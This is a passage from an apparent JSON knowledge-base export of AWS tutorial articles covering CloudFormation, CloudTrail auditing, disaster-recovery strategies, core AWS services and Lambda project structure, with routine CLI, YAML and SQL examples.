'${AWS::StackName}-VpcId'\n  \n  # Stack B: Application Stack\n  Resources:\n    AppSecurityGroup:\n      Type: AWS::EC2::SecurityGroup\n      Properties:\n        VpcId: !ImportValue 'vpc-stack-VpcId'  # Import from Stack A\n  \n  Warning: Cannot delete Stack A while Stack B references its exports\n  ```\n\n- **CloudFormation Macros and Transforms:**\n  ```yaml\n  # AWS::Serverless transform (SAM)\n  AWSTemplateFormatVersion: '2010-09-09'\n  Transform: AWS::Serverless-2016-10-31\n  \n  Resources:\n    MyFunction:\n      Type: AWS::Serverless::Function  # Simplified Lambda syntax\n      Properties:\n        Handler: index.handler\n        Runtime: nodejs18.x\n        CodeUri: ./src\n        Events:\n          Api:\n            Type: Api\n            Properties:\n              Path: /hello\n              Method: get\n  \n  # AWS::Include (import snippets)\n  Transform:\n    Name: AWS::Include\n    Parameters:\n      Location: s3://mybucket/common-resources.yaml\n  ```\n\n- **Drift Detection (Find Manual Changes):**\n  ```bash\n  # Detect drift\n  aws cloudformation detect-stack-drift --stack-name my-stack\n  \n  # Check drift status\n  aws cloudformation describe-stack-drift-detection-status \\\n    --stack-drift-detection-id <detection-id>\n  \n  # View drifted resources\n  aws cloudformation describe-stack-resource-drifts \\\n    --stack-name my-stack\n  \n  Drift states:\n  - IN_SYNC: Resource matches template\n  - MODIFIED: Resource changed outside CloudFormation\n  - DELETED: Resource deleted manually\n  ```\n\n- **StackSets (Multi-Account/Multi-Region):**\n  ```yaml\n  # Deploy same template across accounts/regions\n  aws cloudformation create-stack-set \\\n    --stack-set-name security-baseline \\\n    --template-body file://security.yaml \\\n    --permission-model SERVICE_MANAGED\n  \n  aws cloudformation create-stack-instances \\\n    --stack-set-name security-baseline \\\n    --regions us-east-1 eu-west-1 ap-southeast-1 \\\n    --deployment-targets OrganizationalUnitIds=ou-abc123\n  \n  Use cases:\n  - Compliance (security groups, IAM policies)\n  - Logging (CloudTrail in all accounts)\n  - Networking (VPCs per region)\n  ```\n\n- **Custom Resources (Extend CloudFormation):**\n  ```yaml\n  # Call Lambda for custom logic\n  Resources:\n    CustomLogic:\n      Type: Custom::MyCustomResource\n      Properties:\n        ServiceToken: !GetAtt CustomLambda.Arn\n        CustomParam: some-value\n    \n    CustomLambda:\n      Type: AWS::Lambda::Function\n      Properties:\n        Handler: index.handler\n        Runtime: python3.9\n        Code:\n          ZipFile: |\n            import cfnresponse\n            def handler(event, context):\n                # Custom logic here\n                cfnresponse.send(event, context, cfnresponse.SUCCESS, {\n                    'Result': 'Custom resource created'\n                })\n  \n  Use cases:\n  - Lookup AMI IDs dynamically\n  - Create resources not supported by CloudFormation\n  - Run custom validation\n  ```\n\n- **Resource Policies (Prevent Deletion/Updates):**\n  ```yaml\n  # Stack Policy (apply at stack level)\n  {\n    \"Statement\": [\n      {\n        \"Effect\": \"Deny\",\n        \"Action\": \"Update:Replace\",\n        \"Principal\": \"*\",\n        \"Resource\": \"LogicalResourceId/ProductionDatabase\"\n      },\n      {\n        \"Effect\": \"Allow\",\n        \"Action\": \"Update:*\",\n        \"Principal\": \"*\",\n        \"Resource\": \"*\"\n      }\n    ]\n  }\n  \n  # DeletionPolicy (per resource)\n  Resources:\n    ProductionDatabase:\n      Type: AWS::RDS::DBInstance\n      DeletionPolicy: Retain      # Keep resource when stack deleted\n      UpdateReplacePolicy: Snapshot  # Snapshot before replacement\n  \n  Options: Delete (default), Retain, Snapshot (RDS, EBS)\n  ```\n\n- **Debugging Failed Stacks:**\n  ```\n  1. Check Events tab in CloudFormation console\n     → Shows chronological resource creation/failure\n  \n  2. Look for status: CREATE_FAILED or UPDATE_FAILED\n     → Status reason shows specific error message\n  \n  3. Common errors:\n     - \"Resource limit exceeded\" → Service quotas\n     - \"Access Denied\" → IAM permissions\n     - \"already exists\" → Resource name conflict\n     - \"does not exist\" → Missing dependency\n  \n  4. Enable termination protection for prod:\n     aws cloudformation update-termination-protection \\\n       --stack-name prod-stack \\\n       --enable-termination-protection\n  ```\n\n- **CloudFormation vs Terraform:**\n  ```\n  CloudFormation:\n  + Native AWS integration\n  + No state file management\n  + Free to use\n  + Drift detection built-in\n  - AWS only\n  - YAML/JSON verbose syntax\n  \n  Terraform:\n  + Multi-cloud support\n  + HCL syntax (more readable)\n  + Larger community/modules\n  + Better state manipulation\n  - Requires state file management\n  - Costs (Terraform Cloud)\n  ```\n\n- **Best Practices:**\n  - Use version control (Git) for all templates\n  - Validate templates before deployment: `aws cloudformation validate-template`\n  - Use `cfn-lint` for linting and catching errors early\n  - Parameterize everything environment-specific\n  - Use nested stacks for large infrastructures (>100 resources)\n  - Enable termination protection on production stacks\n  - Use change sets to preview updates before applying\n  - Tag all resources for cost allocation and management\n  - Store secrets in Secrets Manager/Parameter Store, not templates\n  - Use `DeletionPolicy: Retain` for databases and critical resources"
    },
    {
      "id": "swe/aws-cloud/aws-cloudtrail",
      "title": "AWS CloudTrail: Complete Overview",
      "path": [
        "swe",
        "aws-cloud",
        "aws-cloudtrail"
      ],
      "content": "# AWS CloudTrail: Complete Overview\n\nAWS CloudTrail is a governance, compliance, and auditing service that **records API activity** across your AWS account. Think of it as a security camera system for your AWS infrastructure — every API call (who did what, when, and from where) gets logged. It's essential for security investigations, compliance audits, and operational troubleshooting.\n\n## Key Points\n\n- **Records API Calls:** Every action in AWS (console, CLI, SDK, service-to-service) is captured as an \"event.\"\n- **Enabled by Default:** CloudTrail records the last 90 days of management events for free (Event History).\n- **Trails:** Custom configurations that deliver logs to S3 (and optionally CloudWatch Logs) for long-term retention.\n- **Three Event Types:** Management events, data events, and Insights events.\n- **Multi-Region:** A single trail can capture activity across all AWS regions.\n\n## Step-by-Step Explanation & Examples\n\n### 1. How It Works\n\nEvery AWS API call flows through CloudTrail and gets recorded as a JSON event. The lifecycle looks like:\n\n```\nUser/Service makes API call\n        ↓\nCloudTrail captures the event\n        ↓\nEvent appears in Event History (90-day default)\n        ↓\nIf a Trail is configured → logs delivered to S3 / CloudWatch\n        ↓\nOptional: Insights analyzes for anomalies\n```\n\n### 2. Event Structure\n\nEach event is a JSON object with metadata about the API call. This is the \"footage\" from your security camera.\n\n```json\n{\n  \"eventVersion\": \"1.09\",\n  \"userIdentity\": {\n    \"type\": \"IAMUser\",\n    \"principalId\": \"AIDACKCEVSQ6C2EXAMPLE\",\n    \"arn\": \"arn:aws:iam::123456789012:user/alice\",\n    \"accountId\": \"123456789012\",\n    \"userName\": \"alice\"\n  },\n  \"eventTime\": \"2025-03-15T14:32:07Z\",\n  \"eventSource\": \"s3.amazonaws.com\",\n  \"eventName\": \"DeleteBucket\",\n  \"awsRegion\": \"us-west-2\",\n  \"sourceIPAddress\": \"198.51.100.42\",\n  \"userAgent\": \"aws-cli/2.15.0\",\n  \"requestParameters\": {\n    \"bucketName\": \"my-important-bucket\"\n  },\n  \"responseElements\": null,\n  \"errorCode\": null,\n  \"errorMessage\": null\n}\n```\n\nFrom this single event, you can answer: **who** (alice), **what** (DeleteBucket), **when** (2025-03-15T14:32:07Z), **where** (us-west-2), and **how** (aws-cli from IP 198.51.100.42).\n\n### 3. The Three Event Types\n\n| Type | What It Captures | Examples | Default |\n|---|---|---|---|\n| **Management Events** | Control plane operations (resource creation, IAM changes, config changes) | `CreateBucket`, `RunInstances`, `AttachRolePolicy` | Logged by default |\n| **Data Events** | Data plane operations (high-volume reads/writes on resources) | `GetObject`, `PutObject`, `Invoke` (Lambda) | **Not logged by default** — must enable per trail |\n| **Insights Events** | Anomalous activity patterns detected by CloudTrail | Unusual spike in `RunInstances` calls | Optional add-on |\n\n**Analogy:** Management events are like logging who opens and closes doors in a building. Data events are like logging every item someone picks up or puts down inside a room — much higher volume, so you opt in selectively.\n\n### 4. Creating a Trail (CLI)\n\n```bash\n# Create a trail that logs to S3 across all regions\naws cloudtrail create-trail \\\n  --name my-org-trail \\\n  --s3-bucket-name my-cloudtrail-logs-bucket \\\n  --is-multi-region-trail \\\n  --enable-log-file-validation\n\n# Start logging\naws cloudtrail start-logging --name my-org-trail\n\n# Enable data events for a specific S3 bucket\naws cloudtrail put-event-selectors \\\n  --trail-name my-org-trail \\\n  --event-selectors '[\n    {\n      \"ReadWriteType\": \"All\",\n      \"IncludeManagementEvents\": true,\n      \"DataResources\": [\n        {\n          \"Type\": \"AWS::S3::Object\",\n          \"Values\": [\"arn:aws:s3:::my-important-bucket/\"]\n        }\n      ]\n    }\n  ]'\n```\n\n### 5. Creating a Trail (CloudFormation / SAM)\n\n```yaml\nResources:\n  CloudTrailLogsBucket:\n    Type: AWS::S3::Bucket\n    Properties:\n      BucketName: my-cloudtrail-logs-bucket\n      LifecycleConfiguration:\n        Rules:\n          - Id: ArchiveOldLogs\n            Status: Enabled\n            Transitions:\n              - StorageClass: GLACIER\n                TransitionInDays: 90\n\n  CloudTrailBucketPolicy:\n    Type: AWS::S3::BucketPolicy\n    Properties:\n      Bucket: !Ref CloudTrailLogsBucket\n      PolicyDocument:\n        Version: \"2012-10-17\"\n        Statement:\n          - Sid: AllowCloudTrailWrite\n            Effect: Allow\n            Principal:\n              Service: cloudtrail.amazonaws.com\n            Action: s3:PutObject\n            Resource: !Sub \"${CloudTrailLogsBucket.Arn}/*\"\n            Condition:\n              StringEquals:\n                s3:x-amz-acl: bucket-owner-full-control\n          - Sid: AllowCloudTrailACLCheck\n            Effect: Allow\n            Principal:\n              Service: cloudtrail.amazonaws.com\n            Action: s3:GetBucketAcl\n            Resource: !GetAtt CloudTrailLogsBucket.Arn\n\n  MyTrail:\n    Type: AWS::CloudTrail::Trail\n    DependsOn: CloudTrailBucketPolicy\n    Properties:\n      TrailName: my-org-trail\n      S3BucketName: !Ref CloudTrailLogsBucket\n      IsMultiRegionTrail: true\n      EnableLogFileValidation: true\n      IsLogging: true\n```\n\n### 6. Querying with Athena\n\nFor long-term logs in S3, you can query them with Athena using SQL — much faster than downloading and grepping JSON files.\n\n```sql\n-- Find all IAM policy changes in the last 7 days\nSELECT\n  eventTime,\n  userIdentity.userName,\n  eventName,\n  sourceIPAddress,\n  requestParameters\nFROM cloudtrail_logs\nWHERE eventSource = 'iam.amazonaws.com'\n  AND eventName LIKE '%Policy%'\n  AND eventTime > date_add('day', -7, now())\nORDER BY eventTime DESC;\n```\n\n```sql\n-- Find who deleted a specific S3 bucket\nSELECT\n  eventTime,\n  userIdentity.arn,\n  sourceIPAddress,\n  userAgent\nFROM cloudtrail_logs\nWHERE eventName = 'DeleteBucket'\n  AND requestParameters LIKE '%my-important-bucket%';\n```\n\n### 7. CloudWatch Alarms on Sensitive Actions\n\nPair CloudTrail with CloudWatch Logs to get real-time alerts on dangerous activity.\n\n```json\n// CloudWatch Metric Filter pattern\n// Triggers on root account usage\n{ $.userIdentity.type = \"Root\" && $.eventType != \"AwsServiceEvent\" }\n```\n\n```yaml\n# CloudFormation for alert on root login\nRootActivityAlarm:\n  Type: AWS::CloudWatch::Alarm\n  Properties:\n    AlarmName: RootAccountUsage\n    MetricName: RootAccountUsageCount\n    Namespace: CloudTrailMetrics\n    Statistic: Sum\n    Period: 300\n    EvaluationPeriods: 1\n    Threshold: 1\n    ComparisonOperator: GreaterThanOrEqualToThreshold\n    AlarmActions:\n      - !Ref SecuritySNSTopic\n```\n\n## Common Pitfalls\n\n- **Assuming Event History is enough.** It only retains 90 days and only management events. Create a trail for long-term, comprehensive logging.\n- **Not enabling log file validation.** Without it, you can't cryptographically verify logs haven't been tampered with — critical for compliance.\n- **Enabling data events on everything.** S3 `GetObject` events on a high-traffic bucket can generate massive log volume and cost. Be selective.\n- **Forgetting S3 bucket policies.** CloudTrail needs explicit permission to write to your S3 bucket — a missing bucket policy is the #1 setup failure.\n- **Ignoring cross-account/org trails.** In multi-account setups, use AWS Organizations trails to centralize logging instead of configuring per-account.\n\n## Practical Applications\n\n- **Security Investigation:** \"Who deleted that production database at 3 AM?\" — query CloudTrail logs by `eventName`, `eventTime`, and `userIdentity`.\n- **Compliance Auditing:** Prove to auditors that only authorized users access sensitive resources (SOC 2, HIPAA, PCI-DSS all reference audit logging).\n- **Anomaly Detection:** CloudTrail Insights flags unusual patterns — e.g., a sudden spike in `RunInstances` calls could indicate compromised credentials.\n- **Operational Debugging:** Trace failed API calls (`errorCode` field) to understand why a deployment or automation broke.\n- **Automated Remediation:** CloudTrail → EventBridge → Lambda pipeline to auto-respond to risky actions (e.g., revert a public S3 bucket policy).\n\n## References\n\n- [AWS CloudTrail Documentation](https://docs.aws.amazon.com/cloudtrail/latest/userguide/)\n- [CloudTrail Event Reference](https://docs.aws.amazon.com/cloudtrail/latest/userguide/cloudtrail-event-reference.html)\n- [Querying CloudTrail with Athena](https://docs.aws.amazon.com/athena/latest/ug/cloudtrail-logs.html)\n- [CloudTrail Pricing](https://aws.amazon.com/cloudtrail/pricing/)\n- [AWS Security Best Practices](https://docs.aws.amazon.com/security/)\n\n---\n\n## Greater Detail\n\n### Advanced Concepts\n\n- **Organization Trails:** A single trail across all accounts in an AWS Organization. Centralizes audit logging and simplifies compliance — the recommended approach for multi-account setups.\n- **CloudTrail Lake:** A managed query engine that lets you run SQL queries directly on CloudTrail events without setting up Athena + S3. Simplifies investigation workflows but costs more at scale.\n- **Log File Validation:** CloudTrail creates a SHA-256 digest file every hour. You can use `aws cloudtrail validate-logs` to verify no log files were modified or deleted — critical for forensic integrity.\n- **EventBridge Integration:** CloudTrail events can trigger EventBridge rules in near real-time, enabling automated responses (e.g., revoke credentials when `ConsoleLogin` occurs from an unexpected country).\n- **Cost Optimization:** Management events for the first trail are free. Data events and additional trails incur charges. Use event selectors to log only the specific resources and operations you need rather than blanket `All` data events."
    },
    {
      "id": "swe/aws-cloud/aws-disaster-recovery",
      "title": "AWS Disaster Recovery: A Well-Structured Overview",
      "path": [
        "swe",
        "aws-cloud",
        "aws-disaster-recovery"
      ],
      "content": "# AWS Disaster Recovery: A Well-Structured Overview\n\nAWS Disaster Recovery (DR) encompasses strategies and services for protecting applications and data from outages, ensuring business continuity through backup, replication, and failover mechanisms across AWS infrastructure.\n\n## Key Points\n\n- **Definition:** A set of policies, tools, and procedures to recover or continue technology infrastructure and systems following a natural or human-induced disaster.\n- **RTO & RPO:** Recovery Time Objective (how quickly you recover) and Recovery Point Objective (how much data loss is acceptable) drive DR strategy selection.\n- **DR Strategies:** AWS offers four primary approaches: Backup & Restore, Pilot Light, Warm Standby, and Multi-Site Active/Active, each with different cost-performance trade-offs.\n- **Geographic Redundancy:** Leverage multiple AWS Regions and Availability Zones to protect against regional failures.\n- **Automation:** Infrastructure as Code (CloudFormation, Terraform) and automated failover reduce recovery time and human error.\n- **Cost Efficiency:** Pay only for resources used, scaling DR infrastructure up during disasters and down during normal operations.\n- **Testing:** Regular DR drills validate recovery procedures and identify gaps before actual disasters occur.\n\n## Step-by-Step Explanation & Examples\n\n1. **Backup & Restore Strategy (Lowest Cost)**\n   ```bash\n   # Automated EBS snapshots\n   aws ec2 create-snapshot --volume-id vol-1234567890abcdef0 \\\n     --description \"Daily backup\"\n   \n   # S3 cross-region replication for data backup\n   aws s3api put-bucket-replication --bucket source-bucket \\\n     --replication-configuration file://replication.json\n   \n   # RDS automated backups (retention period)\n   aws rds modify-db-instance --db-instance-identifier mydb \\\n     --backup-retention-period 7\n   ```\n\n2. **Pilot Light Strategy (Core Services Running)**\n   ```yaml\n   # CloudFormation template for minimal infrastructure\n   Resources:\n     MinimalRDSInstance:\n       Type: AWS::RDS::DBInstance\n       Properties:\n         DBInstanceClass: db.t3.micro  # Small instance always running\n         AllocatedStorage: 20\n         Engine: postgres\n     \n     # Application servers launched only during failover\n     ApplicationASG:\n       Type: AWS::AutoScaling::AutoScalingGroup\n       Properties:\n         MinSize: 0  # Zero instances normally\n         MaxSize: 10\n         DesiredCapacity: 0\n   ```\n\n3. **Warm Standby Strategy (Scaled-Down Production)**\n   ```bash\n   # Route 53 health checks and failover routing\n   aws route53 create-health-check --health-check-config \\\n     IPAddress=203.0.113.1,Port=80,Type=HTTP,ResourcePath=/health\n   \n   # Auto Scaling to quickly scale up during disaster\n   aws autoscaling set-desired-capacity \\\n     --auto-scaling-group-name dr-asg --desired-capacity 10\n   ```\n\n4. **Multi-Site Active/Active Strategy**\n   ```bash\n   # Route 53 weighted routing across regions\n   aws route53 change-resource-record-sets --hosted-zone-id Z123456 \\\n     --change-batch file://weighted-routing.json\n   \n   # DynamoDB Global Tables for multi-region writes\n   aws dynamodb create-global-table --global-table-name users \\\n     --replication-group RegionName=us-east-1 RegionName=us-west-2\n   ```\n\n5. **Testing DR Procedures**\n   ```python\n   # Automate DR failover testing\n   import boto3\n   \n   # Simulate failover by switching Route 53 records\n   route53 = boto3.client('route53')\n   response = route53.change_resource_record_sets(\n       HostedZoneId='Z123456',\n       ChangeBatch={\n           'Changes': [{\n               'Action': 'UPSERT',\n               'ResourceRecordSet': {\n                   'Name': 'app.example.com',\n                   'Type': 'A',\n                   'SetIdentifier': 'DR-Region',\n                   'Weight': 100,\n                   'AliasTarget': {\n                       'HostedZoneId': 'Z789012',\n                       'DNSName': 'dr-alb.us-west-2.amazonaws.com'\n                   }\n               }\n           }]\n       }\n   )\n   ```\n\n## Common Pitfalls\n\n- Choosing a DR strategy without clearly defining RTO and RPO requirements, leading to over/under-investment.\n- Never testing DR procedures—discovering gaps during an actual disaster is too late.\n- Forgetting to replicate supporting resources (security groups, IAM roles, configurations) to the DR region.\n- Not accounting for cross-region data transfer costs, which can be substantial during failover.\n- Assuming automated backups alone are sufficient—backups don't protect against application-level corruption.\n- Ignoring DNS TTL settings—high TTLs delay failover when switching Route 53 records.\n- Not documenting runbooks or automating failover procedures, leading to confusion during high-stress incidents.\n\n## Practical Applications\n\n- **E-commerce Platforms:** Multi-region active/active setup to prevent revenue loss during regional outages.\n- **Financial Services:** Warm standby with <1 hour RTO for regulatory compliance and customer trust.\n- **SaaS Applications:** Pilot light for cost-effective protection with acceptable 4-6 hour recovery windows.\n- **Content Delivery:** S3 + CloudFront with cross-region replication for media and static assets.\n\n**Example anecdote:** During my time working on a critical system, we had a \"pilot light\" DR setup that looked great on paper. During a scheduled DR test, we discovered our automation scripts hadn't been updated after a recent refactor—they referenced old AMI IDs. What should've been a 30-minute failover took 4 hours. Now we test quarterly and version-control all DR automation alongside application code.\n\n## References\n\n- [AWS Disaster Recovery Whitepaper](https://docs.aws.amazon.com/whitepapers/latest/disaster-recovery-workloads-on-aws/disaster-recovery-workloads-on-aws.html)\n- [AWS Elastic Disaster Recovery](https://aws.amazon.com/disaster-recovery/)\n- [AWS Backup Service](https://aws.amazon.com/backup/)\n- [AWS Well-Architected Framework: Reliability Pillar](https://docs.aws.amazon.com/wellarchitected/latest/reliability-pillar/welcome.html)\n\n---\n\n## Greater Detail\n\n### Advanced Concepts\n\n- **DR Strategy Comparison:**\n  - **Backup & Restore:** RPO/RTO in hours, lowest cost, suitable for non-critical workloads\n  - **Pilot Light:** RPO in minutes, RTO in 10s of minutes, minimal infrastructure always running\n  - **Warm Standby:** RPO/RTO in seconds to minutes, scaled-down version always running\n  - **Multi-Site Active/Active:** Near-zero RPO/RTO, highest cost, full production capacity in multiple regions\n- **AWS Elastic Disaster Recovery (DRS):** Automated continuous replication and orchestrated failover/failback for physical, virtual, and cloud servers.\n- **AWS Backup:** Centralized backup service supporting EBS, RDS, DynamoDB, EFS, S3, and more with policy-based backup plans.\n- **Cross-Region Replication:** Available for S3, RDS, Aurora, DynamoDB Global Tables, and ECR for geographic redundancy.\n- **CloudEndure Migration:** Lift-and-shift migration tool that can also serve as DR solution with continuous replication.\n- **RDS Read Replicas:** Promote read replicas to standalone instances in DR scenarios for database recovery.\n- **Aurora Global Database:** Single Aurora database spanning multiple regions with <1 second replication lag and <1 minute RTO.\n- **S3 Versioning & Object Lock:** Protect against accidental deletions and ransomware with immutable backups.\n- **AWS Resilience Hub:** Assess, validate, and track application resilience against DR targets.\n- **Infrastructure as Code:** Use CloudFormation, CDK, or Terraform to version and quickly rebuild infrastructure in DR regions.\n- **Chaos Engineering:** Practice GameDays and use AWS Fault Injection Simulator to test system resilience proactively.\n- **Data Consistency:** Understand eventual consistency implications in multi-region active/active architectures.\n- **Network Considerations:** Pre-establish VPN connections, Direct Connect links, and VPC peering in DR regions.\n- **Compliance Requirements:** HIPAA, SOC 2, PCI-DSS may mandate specific RPO/RTO targets and geographic data residency.\n- **Cost Optimization:** Use S3 Glacier for long-term backup retention, stopped EC2 instances in pilot light, and Reserved Instances for warm standby.\n- **Runbook Automation:** AWS Systems Manager Automation documents to orchestrate multi-step failover procedures.\n- **Monitoring & Alerting:** CloudWatch alarms, SNS notifications, and EventBridge rules to trigger automated DR responses.\n- **Failback Procedures:** Plan for returning to primary region after disaster resolved—often more complex than failover."
    },
    {
      "id": "swe/aws-cloud/aws-fundemental-services",
      "title": "Basic Most Popular AWS Services: A Well-Structured Overview",
      "path": [
        "swe",
        "aws-cloud",
        "aws-fundemental-services"
      ],
      "content": "# Basic Most Popular AWS Services: A Well-Structured Overview\n\nAmazon Web Services (AWS) offers a wide range of cloud services that help engineers build, deploy, and scale applications. Understanding the most popular AWS services is essential for modern software development and DevOps.\n\n## Key Points\n\n- **EC2 (Elastic Compute Cloud):** Provides scalable virtual servers for running applications.\n- **S3 (Simple Storage Service):** Object storage for files, backups, and static assets.\n- **RDS (Relational Database Service):** Managed relational databases (MySQL, PostgreSQL, etc.).\n- **Lambda:** Serverless compute service for running code in response to events.\n- **DynamoDB:** Managed NoSQL database for fast and flexible data storage.\n- **IAM (Identity and Access Management):** Controls user and service permissions.\n- **CloudWatch:** Monitoring and logging for AWS resources and applications.\n\n## Step-by-Step Explanation & Examples\n\n1. **Launching an EC2 Instance**\n   ```sh\n   aws ec2 run-instances --image-id ami-12345678 --count 1 --instance-type t2.micro\n   ```\n\n2. **Storing a File in S3**\n   ```js\n   // Using AWS SDK for JavaScript\n   const AWS = require('aws-sdk');\n   const s3 = new AWS.S3();\n   s3.putObject({ Bucket: 'my-bucket', Key: 'file.txt', Body: 'Hello AWS!' }, callback);\n   ```\n\n3. **Creating a Lambda Function**\n   ```js\n   exports.handler = async (event) => {\n     return { statusCode: 200, body: 'Hello from Lambda!' };\n   };\n   ```\n\n4. **Querying DynamoDB**\n   ```js\n   const AWS = require('aws-sdk');\n   const dynamo = new AWS.DynamoDB.DocumentClient();\n   dynamo.get({ TableName: 'Users', Key: { userId: '123' } }, callback);\n   ```\n\n## Common Pitfalls\n\n- Misconfiguring IAM roles, leading to security vulnerabilities.\n- Not setting up proper monitoring and alerts (CloudWatch).\n- Over-provisioning resources, resulting in unnecessary costs.\n- Ignoring region selection, which can affect latency and compliance.\n\n## Practical Applications\n\n- Hosting web and mobile applications.\n- Storing and serving static assets.\n- Building scalable APIs and microservices.\n- Managing user authentication and permissions.\n- Real-time data processing and analytics.\n\n## References\n\n- [AWS Services Overview](https://aws.amazon.com/products/)\n- [AWS Free Tier](https://aws.amazon.com/free/)\n- [AWS Documentation](https://docs.aws.amazon.com/)\n\n---\n\n## Greater Detail\n\n### Advanced Concepts\n\n- **Auto Scaling:** Automatically adjust EC2 resources based on demand.\n- **VPC (Virtual Private Cloud):** Isolate and secure resources within a private network.\n- **CloudFormation:** Infrastructure as code for automating resource provisioning.\n- **Elastic Beanstalk:** Simplified deployment and management of applications.\n- **S3 Lifecycle Policies:** Automate data archiving and deletion.\n- **Multi-Region Architectures:** Design for high availability and"
    },
    {
      "id": "swe/aws-cloud/aws-lambda-file-structure",
      "title": "AWS Lambda API Endpoint: Typical File Structure",
      "path": [
        "swe",
        "aws-cloud",
        "aws-lambda-file-structure"
      ],
      "content": "# AWS Lambda API Endpoint: Typical File Structure\n\nA Lambda-based API endpoint connects API Gateway to a Lambda function, usually defined by a **handler** (execution logic), an **OpenAPI spec** (API contract), and a **config file** (infrastructure/environment settings). Your team's pattern of separating these three concerns is solid and aligns well with industry practice — though the specifics vary across teams and frameworks.\n\n## Key Points\n\n- **Handler:** The entry point Lambda executes — should be thin and delegate to services.\n- **OpenAPI Spec:** Defines the API contract (routes, request/response schemas, validation). Often used by API Gateway directly.\n- **Config:** Environment-specific settings, IAM, and infra definitions (SAM, Serverless Framework, CDK, etc.).\n- **Is this standard?** Yes — separating handler, API spec, and config is a well-established pattern. The exact file names and locations vary, but the *separation of concerns* is the standard part.\n\n## Typical Structure\n\n```\nmy-api-endpoint/\n├── src/\n│   ├── handlers/\n│   │   └── getUser.js            # Lambda handler (entry point)\n│   ├── services/\n│   │   └── userService.js        # Business logic\n│   ├── utils/\n│   │   └── response.js           # Standardized response helpers\n│   └── middleware/\n│       └── errorHandler.js       # Centralized error handling\n├── api/\n│   └── openapi.yaml              # OpenAPI 3.0 spec (API contract)\n├── config/\n│   ├── default.json              # Shared config values\n│   └── production.json           # Environment overrides\n├── tests/\n│   ├── handlers/\n│   │   └── getUser.test.js\n│   └── services/\n│       └── userService.test.js\n├── template.yaml                 # SAM/CloudFormation (infra-as-code)\n└── package.json\n```\n\n## Step-by-Step Breakdown\n\n### 1. Handler File\n\nThe handler is what Lambda actually invokes. Think of it as a **receptionist** — it receives the request, routes it to the right department (service), and hands back the response.\n\n```js\n// src/handlers/getUser.js\nconst { getUser } = require(\"../services/userService\");\nconst { success, error } = require(\"../utils/response\");\n\nexports.handler = async (event) => {\n  try {\n    const userId = event.pathParameters?.id;\n    const user = await getUser(userId);\n    return success(200, user);\n  } catch (err) {\n    return error(err.statusCode || 500, err.message);\n  }\n};\n```\n\n```js\n// src/utils/response.js\nconst success = (statusCode, body) => ({\n  statusCode,\n  headers: { \"Content-Type\": \"application/json\" },\n  body: JSON.stringify(body),\n});\n\nconst error = (statusCode, message) => ({\n  statusCode,\n  headers: { \"Content-Type\": \"application/json\" },\n  body: JSON.stringify({ error: message }),\n});\n\nmodule.exports = { success, error };\n```\n\n### 2. OpenAPI Spec\n\nDefines your API contract — routes, methods, parameters, request/response schemas. API Gateway can import this directly, and it doubles as living documentation.\n\n```yaml\n# api/openapi.yaml\nopenapi: 3.0.3\ninfo:\n  title: User API\n  version: 1.0.0\n\npaths:\n  /users/{id}:\n    get:\n      summary: Get a user by ID\n      operationId: getUser\n      parameters:\n        - name: id\n          in: path\n          required: true\n          schema:\n            type: string\n      responses:\n        \"200\":\n          description: User found\n          content:\n            application/json:\n              schema:\n                $ref: \"#/components/schemas/User\"\n        \"404\":\n          description: User not found\n\ncomponents:\n  schemas:\n    User:\n      type: object\n      properties:\n        id:\n          type: string\n        name:\n          type: string\n        email:\n          type: string\n```\n\n**Why keep this?** API Gateway can validate requests against it *before* your Lambda even runs, saving you execution time and cost. It also enables auto-generated client SDKs and documentation.\n\n### 3. Config File\n\nManages environment-specific values. Keeps secrets and environment differences out of your code.\n\n```json\n// config/default.json\n{\n  \"dynamodb\": {\n    \"tableName\": \"users-table\",\n    \"region\": \"us-west-2\"\n  },\n  \"logging\": {\n    \"level\": \"info\"\n  }\n}\n```\n\n```yaml\n# template.yaml (SAM)\nAWSTemplateFormatVersion: \"2010-09-09\"\nTransform: AWS::Serverless-2016-10-31\n\nGlobals:\n  Function:\n    Runtime: nodejs20.x\n    Timeout: 10\n    Environment:\n      Variables:\n        TABLE_NAME: !Ref UsersTable\n\nResources:\n  GetUserFunction:\n    Type: AWS::Serverless::Function\n    Properties:\n      Handler: src/handlers/getUser.handler\n      CodeUri: .\n      Events:\n        GetUser:\n          Type: Api\n          Properties:\n            Path: /users/{id}\n            Method: get\n            RestApiId: !Ref UserApi\n\n  UserApi:\n    Type: AWS::Serverless::Api\n    Properties:\n      StageName: prod\n      DefinitionUri: api/openapi.yaml   # <-- references your OpenAPI spec\n\n  UsersTable:\n    Type: AWS::DynamoDB::Table\n    Properties:\n      TableName: users-table\n      AttributeDefinitions:\n        - AttributeName: id\n          AttributeType: S\n      KeySchema:\n        - AttributeName: id\n          KeyType: HASH\n      BillingMode: PAY_PER_REQUEST\n```\n\n## How Your Team's Pattern Compares\n\n| Concern | Your Team | Common Alternatives |\n|---|---|---|\n| **Handlers** | `handlers/` directory | Same — nearly universal |\n| **OpenAPI** | OpenAPI spec file | Some teams skip this and define routes purely in SAM/Serverless config. Having it is a *better* practice. |\n| **Config** | Config file | SAM `template.yaml`, `serverless.yml`, CDK stacks, or `.env` files. All valid. |\n\nYour team's approach is actually **more disciplined than average**. Many teams skip the OpenAPI spec entirely and define routes inline in their IaC templates, losing the benefits of contract-first design.\n\n## Common Pitfalls\n\n- Putting business logic in the handler instead of a separate service layer — makes testing painful.\n- Letting the OpenAPI spec drift out of sync with actual handler behavior. Automate validation in CI.\n- Hardcoding environment values instead of pulling from config/environment variables.\n- Defining routes in *both* the OpenAPI spec and the IaC template without a single source of truth.\n\n## Practical Applications\n\n- **Contract-First Development:** Write the OpenAPI spec first, then implement handlers to match — reduces miscommunication between frontend and backend teams.\n- **Request Validation:** API Gateway validates against OpenAPI before invoking Lambda, rejecting malformed requests for free.\n- **Auto-Generated Docs:** Tools like Swagger UI or Redoc render your OpenAPI spec as interactive API docs.\n- **Multi-Environment Deploys:** Config files + SAM parameters let you deploy the same code to dev/staging/prod with different settings.\n\n## References\n\n- [API Gateway + OpenAPI Integration](https://docs.aws.amazon.com/apigateway/latest/developerguide/api-gateway-import-api.html)\n- [AWS SAM Template Reference](https://docs.aws.amazon.com/serverless-application-model/latest/developerguide/sam-specification.html)\n- [OpenAPI 3.0 Specification](https://spec.openapis.org/oas/v3.0.3)\n- [Best Practices for Lambda Functions](https://docs.aws.amazon.com/lambda/latest/dg/best-practices.html)\n\n---\n\n## Greater Detail\n\n### Advanced Concepts\n\n- **Contract-First vs Code-First:** Your team's OpenAPI file suggests contract-first design. The alternative (code-first) generates the spec from code annotations — faster to start, harder to maintain.\n- **Middleware (middy):** 